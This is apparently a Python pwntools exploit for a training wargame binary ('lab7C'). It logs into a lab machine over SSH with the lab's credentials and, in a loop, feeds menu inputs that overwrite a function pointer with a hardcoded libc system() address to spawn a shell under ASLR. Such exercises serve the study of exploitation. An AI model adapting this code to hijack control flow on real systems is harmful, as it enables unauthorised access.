from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.aslr = True

s = ssh(host='192.168.203.146', user='lab7C', password='lab07start')
# p = process("./lab7C")
# gdb.attach(p, "break *main+810")

#real
libc_system = 0xb75b9190       # 3076231568
local_libc_system = 0xf7dd0630 # 4158457392
i = 0


while i < 500:

    #_ = s.set_working_directory("/tmp/")
    p = s.process("/levels/lab07/./lab7C")
    p.sendline("1")
    p.sendline("/bin/bash")   # '/bin/bash' is at ESP, 1st arg for libc system().
    p.sendline("3")
    p.sendline("2")
    p.sendline("3076231568")  # CALL EAX to EIP Overwrite. Place libc_system() address in EAX
    p.sendline("5")
    p.sendline("1")
    p.sendline("7")
    p.interactive()
    p.close()

# CALL EAX: libc_system
# ESP     : '/bin/bash'
